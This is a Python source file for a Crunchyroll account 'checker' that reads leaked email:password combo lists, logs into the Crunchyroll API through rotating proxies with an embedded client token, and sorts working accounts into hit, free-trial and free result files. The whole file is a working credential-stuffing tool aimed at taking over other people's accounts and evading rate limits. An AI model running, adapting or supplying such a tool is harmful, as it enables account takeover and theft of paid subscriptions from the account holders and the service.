#!/usr/bin/env python3


### Importing
from src import (
    sendRequest,
    proxy
)
import re


### Some Global Variable
EMAILPASS_REGEX = r'[\w\.]+@[\w\.]+:[\S]+'
DEFAULT_HEADER = {
    "User-Agent": "Crunchyroll/3.47.0 Android/10 okhttp/4.12.0"
}
AUTH_TOKEN = "ejFrYWxhenhhaXFvNDhnZDgzbXg6LVdkamJidmJyNTE5QUxEMEtvUDBTQTgyemdTaHpoNkk="
WARNING_COLOR = '\033[91m'
INVALID_COLOR = '\033[93m'
FREE_TRIAL_COLOR = '\033[94m'
HIT_COLOR = '\033[92m'
FREE_ACCOUNT_COLOR = '\033[96m'
COLOR_END = '\033[0m'


### Checker Class
class CrunchyrollChecker:

    def __init__(
        self,
        filename : str,
        proxy_filename : str | None = None,
        proxyEnable : bool = False
    ):
        
        self.apiUrl = "https://beta-api.crunchyroll.com/"
        self.headers = DEFAULT_HEADER
        self.auth = "Basic " + AUTH_TOKEN
        self.data = {
            "grant_type": "password",
            "scope": "offline_access"
        }
        self.filename = filename

        self.proxyObj = proxy.Proxy(proxy_filename, proxyEnable)
    
    @classmethod
    def create(
        cls,
        filename : str,
        proxy_filename : str | None = None,
        proxyEnable : bool = False
        ):

        self = CrunchyrollChecker(filename, proxy_filename, proxyEnable)
        self._resultFile()
        self._checker()

    def _checker(self):
        file = open(self.filename, errors='ignore')
        for line in file.readlines():
            loginDetail = self._filterEmailPass(line)
            if loginDetail:
                self._letsLogin()
            else:
                continue
        file.close()
        self.hitFile.close()
        self.invalid.close()
    
    def _prepareRequest(
        self,
        request : sendRequest.Request,
        request_for : str,
        **kwargs
    ):
        
        url = self.apiUrl
        data = dict()
        headers = dict(self.headers)
        
        if request_for == "login":
            url += "auth/v1/token"
            data = dict(self.data)
            data['username'] = self.email
            data['password'] = self.password
            headers["authorization"] = self.auth
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        
        elif request_for == "external":
            url += "accounts/v1/me"
            header = kwargs["header"]
            headers.update(header)
        
        else:
            externalID = kwargs["externalID"]
            header = kwargs["header"]
            headers.update(header)
            url += f"subs/v1/subscriptions/{externalID}/products"
        
        request.setRequestData(
            url,
            headers,
            data
        )
    
    def _letsLogin(self):
        request = sendRequest.Request()
        self._prepareRequest(request,"login")
        self._tryToLogin(request)

    def _tryToLogin(
        self,
        request : sendRequest.Request
    ):
        request.setProxy(self.proxyObj.getProxy())
        request.sendRequest()
        res = request.response

        if "error" in res:

            e = res["error"]
            if res["errorType"] == "http":
                if e.code == 401:
                    self._resultSaving('invalid')
                else:
                    print(e)
                    self._resultSaving(error = f'Error in while trying to login {e}')
            
            elif res["errorType"] == "proxy":
                print(self.proxyObj.getProxy(), " Proxy is not working while login ", e)
                self.proxyObj.nextIndex()
                self._tryToLogin(request)

            else:
                print(e)
                self._resultSaving(error = f'Error in while trying to login {e}')

        else:
            try:
                accessToken = res['access_token']
            except KeyError:
                print(f'{self.email}:{self.password} Something went wrong!')
                self._resultSaving(error = f'Acces Token Not found {res}')
                print(res)
            else:
                if accessToken:
                    self._premiumChecker(accessToken)
                else:
                    print(f'{self.email}:{self.password} Something went wrong!')
                    print(res)
                    self._resultSaving(error = f'Acces Token is empty {res}')
    
    def _filterEmailPass(self, line):
        loginDetail = re.findall(EMAILPASS_REGEX, line)
        if loginDetail:
            login_info_parsed = loginDetail[0].split(':')
            if len(login_info_parsed) == 2:
                self.email, self.password = login_info_parsed
                return True
        return None
    
    def _resultFile(self):
        resultDir = 'result//'
        self.hitFile = open(f'{resultDir}hit.txt', 'a')
        self.freeFile = open(f'{resultDir}free.txt', 'a')
        self.invalid = open(f'{resultDir}invalid.txt', 'a')
        self.error = open(f'{resultDir}error.txt', 'a')
        self.trial = open(f'{resultDir}trial.txt', 'a')

    def _resultSaving(
        self,
        file = 'error',
        error = None,
        free_trial = False
        ):

        fileLog = str()
        printMsg = f'{self.email}:{self.password}'
        color = str()
        printLog = str()

        if file == 'error':
            fileRefer = self.error
            fileLog = f'{printMsg} {error}'
            color = WARNING_COLOR
            printLog = error

        elif file == 'invalid':
            fileRefer = self.invalid
            fileLog = printMsg
            color = INVALID_COLOR
            printLog = "Invalid Login Credential"
        
        elif file == 'hit':
            fileLog = printMsg
            if free_trial:
                fileRefer = self.trial
                color = FREE_TRIAL_COLOR
                printLog = "Free Trial Found"
            else:
                fileRefer = self.hitFile
                color = HIT_COLOR
                printLog = "Hit Found"
        else:
            fileRefer = self.freeFile
            fileLog = printMsg
            color = FREE_ACCOUNT_COLOR
            printLog = "Free Account Found"
        
        printMsg = color + f"{printMsg} {printLog}"
        fileLog += '\n'
        
        print(printMsg + COLOR_END)
        fileRefer.write(fileLog)
        fileRefer.flush()
    
    def _premiumChecker(
        self,
        accessToken : str
    ):
        header = dict()
        header["authorization"] = f"Bearer {accessToken}"
        externalID = self._getExternalID(header)
        if externalID:
            self._subscriptionChecker(header, externalID)
        return

    def _getExternalID(
        self,
        header : dict[str, str]
    ):
        request = sendRequest.Request()
        self._prepareRequest(
            request,
            "external",
            header = header
        )

        def gettingExternalID(
            request : sendRequest.Request
        ):
            request.setProxy(self.proxyObj.getProxy())
            request.sendRequest()
            res = request.response

            if "error" in res:
                if res["errorType"] == "proxy":
                    print(self.proxyObj.getProxy(), " Proxy is not working while getting external id ", res["error"])
                    self.proxyObj.nextIndex()

                    return gettingExternalID(request)

                else:
                    self._resultSaving(file = 'free')
                    print(f'Error while getting external id {res}')
            
            else:
                try:
                    externalID = res['external_id']
                except KeyError:
                    print(f'{self.email}:{self.password} Something went wrong! While getting externalID')
                    print(res)
                    self._resultSaving(file = 'free')
                else:
                    return externalID
        
        return gettingExternalID(request)

    def _subscriptionChecker(
        self,
        header : dict[str, str],
        externalID : str
    ):
        request = sendRequest.Request()
        self._prepareRequest(
            request,
            "subscription",
            header = header,
            externalID = externalID
        )

        def checkingSubscription(
            request : sendRequest.Request
        ):
            request.setProxy(self.proxyObj.getProxy())
            request.sendRequest()
            res = request.response

            if "error" in res:
                if res["errorType"] == "http" and res["error"].code == 404:
                    self._resultSaving(file = 'free')
                
                elif res["errorType"] == "proxy":
                    print(self.proxyObj.getProxy(), " Proxy is not working while checking subscription ", res["error"])
                    self.proxyObj.nextIndex()
                    checkingSubscription(request)

                else:
                    print(res)
                    self._resultSaving(error = f'Error while checking subscription {res["error"]}')
            
            else:
                if res['total']:
                    free_trial = res['items'][0]['active_free_trial']
                    self._resultSaving(
                        file = 'hit',
                        free_trial = free_trial
                    )
                else:
                    self._resultSaving(file = 'free')
        
        checkingSubscription(request)

